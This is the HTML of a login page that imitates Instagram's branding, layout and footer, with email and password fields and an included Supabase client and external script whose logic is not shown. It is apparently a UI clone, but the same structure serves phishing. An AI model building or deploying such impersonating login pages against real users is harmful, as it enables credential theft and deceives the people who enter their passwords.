<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login • Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Supabase CDN -->
    <script src="https://unpkg.com/@supabase/supabase-js@2"></script>
</head>
<body class="bg-black text-white min-h-screen">
    <main class="flex flex-col items-center justify-center min-h-screen p-4">
        <div class="w-full max-w-sm">
            <div class="bg-[#121212] p-8 rounded border border-gray-800">
                <div class="text-center mb-8">
                    <img class="w-36 mx-auto" src="insta-logo.png" alt="logo">
                </div>

                <form onsubmit="event.preventDefault()" class="space-y-4">
                    <input id="loginEmail"
                        type="text" 
                        placeholder="Email" 
                        class="w-full bg-[#121212] border border-gray-800 rounded px-4 py-2 focus:outline-none focus:border-gray-600"
                    >
                    
                    <input id="loginPassword"
                        type="Password" 
                        placeholder="Password" 
                        class="w-full bg-[#121212] border border-gray-800 rounded px-4 py-2 focus:outline-none focus:border-gray-600"
                    >

                    <button id="loginBtn"
                        type="submit" 
                        class="w-full bg-[#0095F6] text-white py-2 rounded font-medium"
                    >
                        Log in
                    </button>

                    <div class="flex items-center gap-4 my-6">
                        <hr class="flex-grow border-gray-800">
                        <span class="text-gray-500 text-sm font-medium">OR</span>
                        <hr class="flex-grow border-gray-800">
                    </div>

                    <button 
                        type="button" 
                        class="w-full cursor-not-allowed  text-[#0095F6] font-medium flex items-center justify-center gap-2"
                    >
                        <svg class="w-5 h-5" fill="currentColor" viewBox="0 0 24 24">
                            <path d="M12 2.04C6.5 2.04 2 6.53 2 12.06C2 17.06 5.66 21.21 10.44 21.96V14.96H7.9V12.06H10.44V9.85C10.44 7.34 11.93 5.96 14.22 5.96C15.31 5.96 16.45 6.15 16.45 6.15V8.62H15.19C13.95 8.62 13.56 9.39 13.56 10.18V12.06H16.34L15.89 14.96H13.56V21.96A10 10 0 0 0 22 12.06C22 6.53 17.5 2.04 12 2.04Z"/>
                        </svg>
                        Log in with Facebook
                    </button>

                    <div class="text-center">
                        <a href="#" class="text-xs text-[#0095F6]">Forgot password?</a>
                    </div>
                </form>
            </div>

            <div class="bg-[#121212] mt-4 p-4 rounded border border-gray-800 text-center">
                <p class="text-sm">
                    Don't have an account? 
                    <a href="index.html" class="text-[#0095F6] font-medium">Sign up</a>
                </p>
            </div>

            <div class="mt-4 text-center">
                <p class="text-sm mb-4">Get the app.</p>
                <div class="flex justify-center gap-4">
                    <a href="#" class="w-32">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yz/r/c5Rp7Ym-Klz.png" alt="Get it on Google Play" class="w-full cursor-not-allowed  h-full">
                    </a>
                    <a href="#" class="w-32">
                        <img src="https://static.cdninstagram.com/rsrc.php/v3/yu/r/EHY6QnZYdNX.png" alt="Get it from Microsoft" class="w-full cursor-not-allowed ">
                    </a>
                </div>
            </div>
        </div>

        <footer class="mt-8 text-xs text-gray-500">
            <nav class="flex flex-wrap justify-center gap-4 mb-4">
                <a href="#">Meta</a>
                <a href="#">About</a>
                <a href="#">Blog</a>
                <a href="#">Jobs</a>
                <a href="#">Help</a>
                <a href="#">API</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
                <a href="#">Locations</a>
                <a href="#">Instagram Lite</a>
                <a href="#">Threads</a>
                <a href="#">Contact Uploading & Non-Users</a>
                <a href="#">Meta Verified</a>
            </nav>
            <div class="flex justify-center gap-4">
                <select class="bg-transparent border-none">
                    <option value="en">English</option>
                </select>
                <p>© 2024 Instagram from Meta</p>
            </div>
        </footer>
    </main>

   <script src="script.js"></script>
</body>
</html>
